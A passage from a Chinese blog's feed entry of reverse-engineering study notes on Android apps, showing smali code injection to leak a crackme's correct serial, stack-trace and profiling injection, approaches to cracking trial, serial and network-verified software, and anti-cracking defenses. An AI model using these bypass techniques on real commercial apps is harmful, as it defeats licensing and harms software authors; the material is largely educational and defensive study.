Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v7, v9&#125;, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v7&#125;, Ljava/lang/StringBuilder;-&gt;toString()Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    move-result-object v7</span><br><span class="line"></span><br><span class="line">    move-object v9, v7</span><br><span class="line"></span><br><span class="line">    .line 56</span><br><span class="line">    :cond_2</span><br><span class="line">    invoke-virtual &#123;v3, v9&#125;, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;#将v9的结果加入到v3</span><br><span class="line"></span><br><span class="line">    .line 49</span><br><span class="line">    nop</span><br><span class="line"></span><br><span class="line">    .end local v8    # &quot;b&quot;:B</span><br><span class="line">    .end local v9    # &quot;hexstr&quot;:Ljava/lang/String;</span><br><span class="line">    add-int/lit8 v6, v6, 0x1</span><br><span class="line"></span><br><span class="line">    goto :goto_0</span><br><span class="line"></span><br><span class="line">    .line 58</span><br><span class="line">    :cond_3</span><br><span class="line">    const/4 v5, 0x0#v5=0</span><br><span class="line"></span><br><span class="line">    .local v5, &quot;i&quot;:I</span><br><span class="line">    :goto_1</span><br><span class="line">    invoke-virtual &#123;v3&#125;, Ljava/lang/StringBuilder;-&gt;length()I#获取v3的长度到v6</span><br><span class="line"></span><br><span class="line">    move-result v6</span><br><span class="line"></span><br><span class="line">    if-ge v5, v6, :cond_4</span><br><span class="line"></span><br><span class="line">    .line 59</span><br><span class="line">    invoke-virtual &#123;v3, v5&#125;, Ljava/lang/StringBuilder;-&gt;charAt(I)C#取v3下标为v5的字符到v6</span><br><span class="line"></span><br><span class="line">    move-result v6</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v4, v6&#125;, Ljava/lang/StringBuilder;-&gt;append(C)Ljava/lang/StringBuilder;#将v6加入到v4</span><br><span class="line"></span><br><span class="line">    .line 58</span><br><span class="line">    add-int/lit8 v5, v5, 0x2#v5自增2</span><br><span class="line"></span><br><span class="line">    goto :goto_1</span><br><span class="line"></span><br><span class="line">    .line 60</span><br><span class="line">    .end local v5    # &quot;i&quot;:I</span><br><span class="line">    :cond_4</span><br><span class="line">    invoke-virtual &#123;v4&#125;, Ljava/lang/StringBuilder;-&gt;toString()Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    move-result-object v5#获取v4内容到v5</span><br><span class="line"></span><br><span class="line">    .line 61</span><br><span class="line">    .local v5, &quot;userSN&quot;:Ljava/lang/String;</span><br><span class="line">    invoke-virtual &#123;v5, p2&#125;, Ljava/lang/String;-&gt;equalsIgnoreCase(Ljava/lang/String;)Z#判断v5与sn的内容是否相等，返回值存到v6</span><br><span class="line"></span><br><span class="line">    move-result v6</span><br><span class="line">    :try_end_0</span><br><span class="line">    .catch Ljava/security/NoSuchAlgorithmException; &#123;:try_start_0 .. :try_end_0&#125; :catch_0</span><br><span class="line"></span><br><span class="line">    if-nez v6, :cond_5</span><br><span class="line"></span><br><span class="line">    .line 62</span><br><span class="line">    return v0</span><br><span class="line"></span><br><span class="line">    .line 68</span><br><span class="line">    .end local v1    # &quot;digest&quot;:Ljava/security/MessageDigest;</span><br><span class="line">    .end local v2    # &quot;bytes&quot;:[B</span><br><span class="line">    .end local v3    # &quot;sb1&quot;:Ljava/lang/StringBuilder;</span><br><span class="line">    .end local v4    # &quot;sb2&quot;:Ljava/lang/StringBuilder;</span><br><span class="line">    .end local v5    # &quot;userSN&quot;:Ljava/lang/String;</span><br><span class="line">    :cond_5</span><br><span class="line">    nop</span><br><span class="line"></span><br><span class="line">    .line 69</span><br><span class="line">    return v7</span><br><span class="line"></span><br><span class="line">    .line 42</span><br><span class="line">    :cond_6</span><br><span class="line">    :goto_2</span><br><span class="line">    return v0</span><br><span class="line"></span><br><span class="line">    .line 64</span><br><span class="line">    :catch_0</span><br><span class="line">    move-exception v1</span><br><span class="line"></span><br><span class="line">    .line 66</span><br><span class="line">    .local v1, &quot;e&quot;:Ljava/security/NoSuchAlgorithmException;</span><br><span class="line">    invoke-virtual &#123;v1&#125;, Ljava/security/NoSuchAlgorithmException;-&gt;printStackTrace()V</span><br><span class="line"></span><br><span class="line">    .line 67</span><br><span class="line">    return v0</span><br><span class="line"></span><br><span class="line">    .line 40</span><br><span class="line">    .end local v1    # &quot;e&quot;:Ljava/security/NoSuchAlgorithmException;</span><br><span class="line">    :cond_7</span><br><span class="line">    :goto_3</span><br><span class="line">    return v0</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><p><code>.line 61</code>是关键，如果前面分析不出来，那我们用LogCat将v5打印出来，不就知道v5的值是多少了吗？我们尽量不用它设置区间范围的寄存器，所以将该方法的寄存器加1，<code>.locals 11</code>修改为<code>.locals 12</code>，原本程序只需要用v0~v10，那我们用v11就好。在<code>.line 61</code>里注入<code>Log.v()</code>输出v5的值，插入下面两条代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const-string v11, &quot;realSN&quot;</span><br><span class="line">invoke-static &#123;v11, v5&#125;, Landroid/util/Log;-&gt;v(Ljava/lang/String;Ljava/lang/Sting;)I</span><br></pre></td></tr></table></figure><p>在<code>.line 61</code>处的代码为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.line 61</span><br><span class="line">.local v5, &quot;userSN&quot;:Ljava/lang/String;</span><br><span class="line">const-string v11, &quot;realSN&quot;</span><br><span class="line">invoke-static &#123;v11, v5&#125;, Landroid/util/Log;-&gt;v(Ljava/lang/String;Ljava/lang/Sting;)I</span><br><span class="line">invoke-virtual &#123;v5, p2&#125;, Ljava/lang/String;-&gt;equalsIgnoreCase(Ljava/lang/String;)Z</span><br><span class="line"></span><br><span class="line">move-result v6</span><br></pre></td></tr></table></figure><p>到达<code>.line 61</code>处需要输入16位注册码，点击注册。发现闪退。回到LogCat查看信息，发现它说在android.util.Log包中没找到v()方法。怎么可能呢？我觉得可能是编写这个程序时没有导入android.util.Log包，导致利用不了该包中的方法。</p><img src="/posts/d368aa06/7.2.1.jpg" class="" title="错误"><p>如果用的是AK，可以直接在需要添加Log代码处右键 -&gt; 插入代码 -&gt; Log，会在需要添加代码的地方插入如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const-string v0, &quot;you message&quot;</span><br><span class="line"></span><br><span class="line">invoke-static &#123;v0&#125;, Lcom/android/killer/Log;-&gt;LogStr(Ljava/lang/String;)V</span><br></pre></td></tr></table></figure><p>此时将插入的代码修改一下，寄存器的值改为v5即可，部分<code>.line 61</code>的内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.line 61</span><br><span class="line">.local v5, &quot;userSN&quot;:Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">invoke-static &#123;v5&#125;, Lcom/android/killer/Log;-&gt;LogStr(Ljava/lang/String;)V</span><br><span class="line"></span><br><span class="line">invoke-virtual &#123;v5, p2&#125;, Ljava/lang/String;-&gt;equalsIgnoreCase(Ljava/lang/String;)Z</span><br><span class="line"></span><br><span class="line">move-result v6</span><br></pre></td></tr></table></figure><p>再次运行，输入16位注册码，点击注册。此时LogCat信息中显示正确的注册码。</p><img src="/posts/d368aa06/7.2.3.jpg" class="" title="正确注册码"><p>可以在程序中验证该注册码是否正确。</p><img src="/posts/d368aa06/7.2.2.jpg" class="" title="注册成功"><h3 id="7-2-2-栈跟踪法"><a href="#7-2-2-栈跟踪法" class="headerlink" title="7.2.2 栈跟踪法"></a>7.2.2 栈跟踪法</h3><p>栈跟踪法同样属于代码注入的范畴。它主要是手动向反汇编后的Smali文件中加入栈跟踪信息输出的代码。与注入Log输出的代码不同的是，栈跟踪法只需知道大概的代码注入点。而且注入代码后的反馈信息比Log注入要详细得多。比如在<code>app-debug.apk</code>中，输入错误注册码会弹出Toast()，我们想知道这个Toast()是何时被调用的。</p><p>采用5.2所讲的特征函数法，在反汇编代码中查找Toast，发现有2个Toast.show()方法。而且它们的上面是字符串的id值。通过查找发现0x7f0e006c是注册失败，0x7f0e006a是注册成功。</p><img src="/posts/d368aa06/7.2.4.jpg" class="" title="特征函数法查找"><p>因为我们是去到了注册失败的那条路，所以在注册失败即<code>.line 26</code>中，Toast.show()方法后添加输出栈跟踪信息的代码即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">new-instance v0, Ljava/lang/Exception;</span><br><span class="line">const-string v1, &quot;print trace&quot;</span><br><span class="line">invoke-direct &#123;v0, v1&#125;, Ljava/lang/Exception;-&gt;&lt;init&gt;(Ljava/lang/String;)V</span><br><span class="line">invoke-virtual &#123;v0&#125;, Ljava/lang/Exception;-&gt;printStackTrace()V</span><br></pre></td></tr></table></figure><p>在LogCat中输出警告信息：</p><img src="/posts/d368aa06/7.2.5.jpg" class="" title="特征函数法查找"><p>栈跟踪信息记录了程序从启动到<code>printStackTrace()</code>被执行期间所有被调用过的方法。从下往上查看栈跟踪信息，找到第一条以<code>com.example.crackme</code>开头的信息，发现最开始调用的是<code>OnClick()</code>方法，然后是<code>OnCreate()</code>方法。如此一来，函数的执行流程就一清二楚了。</p><h3 id="7-2-3-Method-Profiling"><a href="#7-2-3-Method-Profiling" class="headerlink" title="7.2.3 Method Profiling"></a>7.2.3 Method Profiling</h3><p>Method Profiling相当于OD的trace功能，它的作用是在执行程序时记录下每个被调用的API名称。</p><p>在DDMS中选中需要关注的程序，点击工具栏中的<code>Start Method Profiling</code>，在程序中执行想要分析的操作，操作完后点击<code>Stop Method Profiling</code>，等待片刻就会弹出TraceView窗口。</p><img src="/posts/d368aa06/7.2.6.png" class="" title="TraceView窗口"><p>任意一个调用方法都有Parents和Children子项，其中Parents表示该方法被哪个方法调用，Children表示该方法调用了哪些方法。</p><p>如果我们想要Method Profiling的代码一开始就执行了，要想对它使用Method Profiling就需要查找开始点与结束点，然后手动注入代码。在android.os.Debug类中，提供了<code>startMethodTracing()</code>与<code>stopMethodTracing()</code>两个方法来开启与关闭Method Profiling。</p><p>Java代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">android.os.Debug.startMethodTracing(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">a();</span><br><span class="line">android.os.Debug.stopMethodTracing();</span><br></pre></td></tr></table></figure><p>字符串“123”为trace文件名，上面的代码在执行后会在SD卡的根目录中生成<code>123.trace</code>文件，这个文件包含了a()方法执行过程中所有的方法调用与CPU占用时间等信息。生成的文件可以将它pull出来，用Android SDK中tools目录下的traceview打开：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">traceview 123.trace</span><br></pre></td></tr></table></figure><p>另外，注入的代码在运行时需要往SD卡中写入文件，因此还需要在反编译的<code>AndroidManifest.xml</code>文件中添加SD卡写入权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission adnroid:name=&quot;android.permission.WRITE_EXTERNAL_STORACE&quot; /&gt;</span><br></pre></td></tr></table></figure><p>如果确定不了开始点与结束点，可以在Activity的<code>OnCreate()</code>方法中注入<code>startMethodTracing()</code>代码，反汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const-string v0, &quot;123&quot;</span><br><span class="line">invoke-static &#123;v0&#125;, Landroid/os/Debug;-&gt;startMethodTracing(Ljava/lang/String;)V</span><br></pre></td></tr></table></figure><p>在<code>OnStop()</code>方法中注入<code>stopMethodTracing()</code>代码，反汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;&#125;, Landroid/os/Debug;-&gt;stopMethodTracing()V</span><br></pre></td></tr></table></figure><p>这样当程序打开并关闭后就会生成<code>123.trace</code>文件，然后使用traceview工具分析即可。</p><h2 id="7-3-使用IDA-Pro动态调试so文件"><a href="#7-3-使用IDA-Pro动态调试so文件" class="headerlink" title="7.3 使用IDA Pro动态调试so文件"></a>7.3 使用IDA Pro动态调试so文件</h2><p>详情请看我的另一篇文章：<a href="https://v5le0n9.github.io/posts/15be101a.html#9-IDA%E5%8A%A8%E6%80%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81">Android逆向入门教程 9.IDA动态破解登录验证</a></p><h1 id="8-Android软件的破解技术"><a href="#8-Android软件的破解技术" class="headerlink" title="8. Android软件的破解技术"></a>8. Android软件的破解技术</h1><h2 id="8-1-试用版软件"><a href="#8-1-试用版软件" class="headerlink" title="8.1 试用版软件"></a>8.1 试用版软件</h2><p>免费试用版软件是Android平台上比较常见的一种商业软件，这种软件的自我保护能力一般较弱，通常可以手动破解。</p><h3 id="8-1-1-试用版软件的种类"><a href="#8-1-1-试用版软件的种类" class="headerlink" title="8.1.1 试用版软件的种类"></a>8.1.1 试用版软件的种类</h3><p>Android平台的试用版软件大致分为三类：免费试用版、演示版与限制功能版免费版。</p><p>免费试用版的软件通常有一个免费试用期限或次数限制，当达到了期限或免费次数后，软件会提示过期，提醒用户购买软件。</p><p>演示版软件一般只提供软件的部分功能供用户使用，此类软件通常是“免费”的，用户要想使用软件的全部功能则需要向软件作者购买正式版的软件，作者会提供完整版的安装包及使用权限。</p><p>限制功能免费版的软件通常将软件根据功能分成几个级别，例如免费版、高级版、专业版等。免费版只提供最基础的功能，而专业版或高级版则提供更多或全部功能，根据作者的授权风格不同，这三种级别的软件可能使用同一个软件安装包，通过不同的授权来区别使用权限，或使用不同的安装包提供不同的软件功能。</p><h3 id="8-1-2-实例破解——针对授权KEY方式的破解"><a href="#8-1-2-实例破解——针对授权KEY方式的破解" class="headerlink" title="8.1.2 实例破解——针对授权KEY方式的破解"></a>8.1.2 实例破解——针对授权KEY方式的破解</h3><p>破解试用版软件的前提是试用软件中提供了软件的完整功能（即有些功能显示灰色，需要购买才能使用），否则即使解除了软件的授权限制也无法使用完整的功能，失去了破解的意义。</p><p>在使用授权KEY方式分辨授权类型时，可能会用到<code>createPackageContext()</code>方法，它可以创建其它程序的Context，通过这个Context可以访问其它软件包的资源，甚至可以执行其它软件包的代码。但这个方法可能抛出java.lang.SecurityException异常，这个异常为安全异常，通常一个软件是不能够创建其它程序Context的，除非它们拥有相同的用户ID与签名。用户ID是一个字符串标识，在程序<code>AndroidManifest.xml</code>文件的manifest标签中指定，格式为android:sharedUserId=”xxx.xxx.xxx”，当两个程序中指定了相同的用户ID时，这两个程序将运行在同一个进程空间，它们之间的资源此时可以相互访问，如果它们的签名也相同的话，还可以相互执行软件包之间的代码。</p><h2 id="8-2-序列号保护"><a href="#8-2-序列号保护" class="headerlink" title="8.2 序列号保护"></a>8.2 序列号保护</h2><p>序列号保护又称为注册码保护。通常在购买这种保护方式的软件是，用户需要向软件作者提供注册信息(用户名或机器码)，软件作者通过自己编写的“算号”程序计算出注册码发回给用户，用户使用这个注册码完成整个注册过程。“算号”软件也称为注册机，在计算可逆加密算法程序的注册码时，它通常是软件加密算法的一个逆过程。</p><p>序列号保护建议：</p><ul><li><p>序列号加入机器码验证，做到一机一码。</p></li><li><p>使用NDK编写注册模块。将软件注册版提供的功能进行加密，例如对相关代码或数据使用AES、DES等加密算法进行加密，软件在运行时检测注册信息，如果是注册版用户则根据注册信息生成正确的解密密钥，最后使用这个密钥对注册版功能进行解密。</p><p>根据注册信息生成密钥的一种思路可以是：在判断用户注册码正确的情况下，取注册码的前8位对其每个字节进行异或运算，然后使用这8位异或后的字节作为加密密钥，对注册功能代码的解密密钥进行AES/DES加密运算(AES/DEX的加密密钥即为解密密钥)，将生成的加密数据写入程序的配置文件(SharedProferences或File都可以)，软件在运行时读取该数据对代码进行解密，解密成功即说明是注册版用户。</p></li><li><p>加入其它类型的保护方式，多种保护方式结合。</p></li></ul><h2 id="8-3-网络验证"><a href="#8-3-网络验证" class="headerlink" title="8.3 网络验证"></a>8.3 网络验证</h2><p>网络验证是指软件在运行时需要联网进行一些验证。网络连接方式可以是Socket连接与HTTP连接，验证的内容可以是软件注册信息验证、代码完整性验证以及软件功能解密等。</p><h3 id="8-3-1-网络验证保护思路"><a href="#8-3-1-网络验证保护思路" class="headerlink" title="8.3.1 网络验证保护思路"></a>8.3.1 网络验证保护思路</h3><p>软件通过网络向验证服务器请求反馈信息，这些信息可能是静态的(例如服务器上的某个文件)，也可能是动态的(例如传递一些特定的参数访问服务器的ASP或PHP脚本，服务器根据不同的参数返回不同的数据)，还有可能是交互的(例如软件定义了一套与服务器交互的协议，通过Socket方式进行通信)。</p><p>对于静态的反馈信息，分析人员能够手动访问网络获取所有信息的内容，这样的软件在破解时相对简单，只需要找到验证点补丁上相应的信息即可。</p><p>动态的反馈信息处理起来则比较麻烦，由于无法得知完整的信息内容，就需要尝试构造不用参数的信息来获取返回结果，这可能需要多次运行软件，并且效果可能并不理想，尤其在参数与反馈信息被加密的情况下，还需要花大量的时间来对信息进行解密。</p><p>交互式的网络验证是最难破解的，交互式网络验证的服务器能够对信息进行更好的控制，这种验证多用于对软件功能的保护以及对软件使用者合法性的检测上，软件功能保护将软件的核心功能从客户端转向了服务端，客户端软件只是成为了一个数据显示工具，而合法性检测例如常见的“心跳包”检测，一旦软件与服务器断开连接，软件就拒绝提供任何功能或者干脆停止运行。</p><h3 id="8-3-2-实例破解——针对网络验证静态方式的破解"><a href="#8-3-2-实例破解——针对网络验证静态方式的破解" class="headerlink" title="8.3.2 实例破解——针对网络验证静态方式的破解"></a>8.3.2 实例破解——针对网络验证静态方式的破解</h3><p>既然软件会联网访问服务器上的数据，那么可以先找出服务器的地址。除了使用静态分析查找服务器地址外，还可以通过网络抓包的方式来获取，网络抓包工具可以使用Android移植版的tcpdump工具，该工具在Android模拟器的<code>system/xbin</code>目录下。</p><p>执行抓包命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell tcpdump -p -vv 0 -w /sdcard/capture.pcap</span><br></pre></td></tr></table></figure><p>导出包文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /sdcard/capture.pcap</span><br></pre></td></tr></table></figure><p>导出后可用Wireshark查看流量包，筛选出HTTP与TCP数据包，找到网址。</p><p>之后再根据网址的静态内容嵌入到Smali代码中，去掉网络验证即可。（具体实现还没有找到好的例子，以后可能补上）</p><h2 id="8-4-重启验证"><a href="#8-4-重启验证" class="headerlink" title="8.4 重启验证"></a>8.4 重启验证</h2><p>重启验证是一种常见的软件保护技术，它的保护强度与开发人员重启验证的保护思路有关。</p><h3 id="8-4-1-重启验证保护思路"><a href="#8-4-1-重启验证保护思路" class="headerlink" title="8.4.1 重启验证保护思路"></a>8.4.1 重启验证保护思路</h3><p>重启验证的通常做法是：在软件注册时不直接提示注册成功与否，而是将注册信息保存下来，然后在下次启动时读取并验证，如果失败则软件仍未注册，成功则开启注册版的功能。</p><p>Android系统保存信息的方法有限，只能是内部存储、外部存储、数据库与SharedProferences等4种方式。破解者通常可以在短时间内找到注册信息的保存位置，因此，在实际使用重启验证的过程中，注册信息必须要加密存储才能保证其保护强度。几种常见的保护方案如下：</p><ul><li>单一保护。重启验证保护模块使用Java代码编写，注册信息加密保存到内部存储中。</li><li>单一保护。重启验证保护模块使用Native代码编写，注册信息加密保存到内部存储中。</li><li>多重保护。重启验证保护模块使用Native代码编写，并在代码中加入网络验证。</li></ul><h1 id="9-Android程序的反破解技术"><a href="#9-Android程序的反破解技术" class="headerlink" title="9. Android程序的反破解技术"></a>9. Android程序的反破解技术</h1><p>逆向Android程序的整个过程可分为反编译、静态分析、动态调试、重编译4个环节，从这4个环节出发，分析如何在每个环节中保护Android程序。</p><h2 id="9-1-对抗反编译"><a href="#9-1-对抗反编译" class="headerlink" title="9.1 对抗反编译"></a>9.1 对抗反编译</h2><p>对抗反编译是指APK文件无法通过反编译工具(如Apktool、BakSmali、dex2jar)对其进行反编译，或者反编译后无法得到软件正确的反汇编代码。</p><p>对抗反编译工具的思路是：寻找反编译工具在处理APK或DEX文件时的缺陷，然后在自己的软件中加以利用，让反编译工具处理这些“特制”的APK文件时抛出异常而反编译失败。这样编写出来的软件能够在手机上正常使用，但在反编译工具的眼里却是一个“畸形”的文件。</p><p>如何查找反编译工具的缺陷？两种方式：阅读反编译工具源码和压力测试。</p><p><strong>阅读反编译工具源码</strong></p><p>目前大多数Android软件的反汇编工具都是开源的，可以很方便通过阅读源码来查找缺陷。查找的思路可以根据APK文件的处理环节来展开，例如资源文件处理、DEX文件校验、DEX文件类代码解析等。但通常情况下，反编译工具在发布前都经过多次测试，要想找出代码的缺陷非常困难。因此这种方法具体实施起来比较困难。</p><p><strong>压力测试</strong></p><p>收集大量的APK文件存放进一个目录，编写脚本或程序调用反编译工具对目录下的所有APK文件进行反编译。不同的软件从大小、内容到结构组织都不尽相同，反编译工具在处理它们时有可能会出现异常。从反编译的出错信息中查找反编译工具的缺陷，然后在软件开发中加以利用。</p><h2 id="9-2-对抗静态分析"><a href="#9-2-对抗静态分析" class="headerlink" title="9.2 对抗静态分析"></a>9.2 对抗静态分析</h2><h3 id="9-2-1-代码混淆技术"><a href="#9-2-1-代码混淆技术" class="headerlink" title="9.2.1 代码混淆技术"></a>9.2.1 代码混淆技术</h3><p>使用Native代码代替Java代码是很好的代码保护手段，Google在Android 2.3的SDK中正式加入了ProGuard代码混淆工具。</p><p>ProGuard提供了压缩、混淆、优化Java代码以及反混淆栈跟踪的功能。ProGuard默认情况下会对class文件中所有的类、方法以及字段进行混淆，经过混淆的类会面目全非。</p><h3 id="9-2-2-NDK保护"><a href="#9-2-2-NDK保护" class="headerlink" title="9.2.2 NDK保护"></a>9.2.2 NDK保护</h3><p>用Native代码代替Java代码。</p><h3 id="9-2-3-外壳保护"><a href="#9-2-3-外壳保护" class="headerlink" title="9.2.3 外壳保护"></a>9.2.3 外壳保护</h3><p>外壳保护是一种代码加密技术，在Windows平台的软件中广泛被使用。经过外壳保护的软件，展现在分析人员面前的是外壳的代码，因此很大程度上保护了软件被人破解。</p><p>Java代码由于其语言自身的特殊性，没有外壳保护的概念，只能通过混淆方式对其进行保护。外壳保护重点针对使用Android NDK编写的Native代码，逆向Native代码本身就很困难了，再加上外壳保护难上加难。目前已知可用于ARM Linux内核程序的加壳工具只有UPX。</p><h2 id="9-3-对抗动态调试"><a href="#9-3-对抗动态调试" class="headerlink" title="9.3 对抗动态调试"></a>9.3 对抗动态调试</h2><h3 id="9-3-1-检测调试器"><a href="#9-3-1-检测调试器" class="headerlink" title="9.3.1 检测调试器"></a>9.3.1 检测调试器</h3><p>动态调试使用调试器来挂钩软件，获取软件运行时的数据，我们可以在软件中加入检测调试器的代码，当检测到软件被调试器连接时，中止软件的运行。</p><p>在<code>AndroidManifest.xml</code>文件中application标签中加入<code>android:debuggable=&quot;false&quot;</code>让程序不可调试，这样如果别人想调试该程序就必然会修改它的值，我们在代码中检查它的值来判断程序是否被修改过，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((getApplicationInfo().flags &amp;= ApplicationInfo.FLAG_DEBUGGABLE) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    Log.e(<span class="string">&quot;com.droider.antidebug&quot;</span>,<span class="string">&quot;程序被修改为可调试状态&quot;</span>);</span><br><span class="line">    android.os.Process.killProcess(android.os.Process.myPid());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ApplicationInfo.FLAG_DEBUGGABLE</code>对应<code>android:debuggable=&quot;true&quot;</code>，如果该标志被置位，说明程序被修改，此时可以果断中止程序运行。</p><p>另外，Android SDK中提供了一个方法方便程序员来检测调试器是否已经连接，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android.os.Debug.isDebuggerContected()</span><br></pre></td></tr></table></figure><p>如果方法返回true，说明调试器已经连接。我们可以随机地在软件中插入这行代码来检测调试器，碰到有调试器连接就果断地结束运行。</p><h3 id="9-3-2-检测模拟器"><a href="#9-3-2-检测模拟器" class="headerlink" title="9.3.2 检测模拟器"></a>9.3.2 检测模拟器</h3><p>软件发布后会安装到用户的手机中运行，如果发现软件运行在模拟器中，很显然不合常理，可能是有人试图破解或分析它。</p><p>模拟器与真机有着许多差异，可以输入命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell getprop</span><br></pre></td></tr></table></figure><p>查看并对比它们的属性值，经过对比发现，有如下几个属性值可以用来判断软件是否运行在模拟器中：</p><ul><li>ro.product.model：该值在模拟器中为sdk，通常在真机中它的值为手机型号。</li><li>ro.build.tags：该值在模拟器中为test-keys，通常在真机中它的值为release-keys。</li><li>ro.kernel.qemu：该值在模拟器中为1，通常在真机中没有该属性。</li></ul><h2 id="9-4-防止重编译"><a href="#9-4-防止重编译" class="headerlink" title="9.4 防止重编译"></a>9.4 防止重编译</h2><h3 id="9-4-1-检查签名"><a href="#9-4-1-检查签名" class="headerlink" title="9.4.1 检查签名"></a>9.4.1 检查签名</h3><p>破解者通常不可能拥有与开发人员相同的密钥文件（密钥文件被盗除外），因此签名成了Android软件一种有效的身份标识。如果软件运行时的签名与自己发布时的不同，说明软件被篡改过。</p><p>Android SDK中提供了检测软件签名的方法，可以调用PackageManager类的<code>getPackageInfo()</code>方法。由于返回的签名较长，可用其Hash值在代码中进行比较。</p><h3 id="9-4-2-校验保护"><a href="#9-4-2-校验保护" class="headerlink" title="9.4.2 校验保护"></a>9.4.2 校验保护</h3><p>重编译Android软件的实质是重新编译<code>classes.dex</code>文件，代码经过重新编译后，生成的<code>classes.dex</code>文件的Hash值已经改变，我们可以检查程序的安装后<code>classes.dex</code>文件的Hash值来判断软件是否被重打包过。</p><h1 id="10-Android系统攻击与防范"><a href="#10-Android系统攻击与防范" class="headerlink" title="10. Android系统攻击与防范"></a>10. Android系统攻击与防范</h1><h2 id="10-1-Anroid手机ROOT原理"><a href="#10-1-Anroid手机ROOT原理" class="headerlink" title="10.1 Anroid手机ROOT原理"></a>10.1 Anroid手机ROOT原理</h2><p>手机ROOT是通过已经公布的Android系统本地提权漏洞，借助漏洞利用程序来提升系统的用户权限。手机ROOT分为临时ROOT与永久ROOT。临时ROOT是指临时性的获取系统root权限，不对系统进行任何修改，而永久ROOT是指修改Android系统，手机可以随时获取root权限。</p><h2 id="10-2-ROM安全"><a href="#10-2-ROM安全" class="headerlink" title="10.2 ROM安全"></a>10.2 ROM安全</h2><p>ROM，只读存储器。手机ROM指的是存放手机固件代码的存储器，可以理解为手机的“系统”，类似于Windows系统安装光盘。</p><h3 id="10-2-1-ROM的种类"><a href="#10-2-1-ROM的种类" class="headerlink" title="10.2.1 ROM的种类"></a>10.2.1 ROM的种类</h3><p>根据ROM制作者不同，Android系统的ROM分为如下三类：</p><ul><li>官方ROM：手机出厂时被刷入的ROM。</li><li>第三方ROM：由第三方ROM制作团队或厂商制作的ROM。</li><li>民间个人版ROM：个人在官方ROM或第三方ROM的基础上进行修改而成的ROM。</li></ul><h1 id="11-DroidKongFu变种病毒实例分析"><a href="#11-DroidKongFu变种病毒实例分析" class="headerlink" title="11. DroidKongFu变种病毒实例分析"></a>11. DroidKongFu变种病毒实例分析</h1><img src="/posts/d368aa06/11.1.1.jpg" class="" title="DroidKongFu变种病毒执行流程图">]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记是学习看雪“非虫”的《Android软件安全与逆向分析》一书中的内容所写。&lt;/p&gt;</summary>
    
    
    
    <category term="Android逆向" scheme="http://example.com/categories/Android%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>Android移动安全相关工具</title>
    <link href="http://example.com/posts/78ecec07.html"/>
    <id>http://example.com/posts/78ecec07.html</id>
    <published>2022-07-28T14:18:08.225Z</published>
    <updated>2022-08-07T11:01:50.337Z</updated>
    
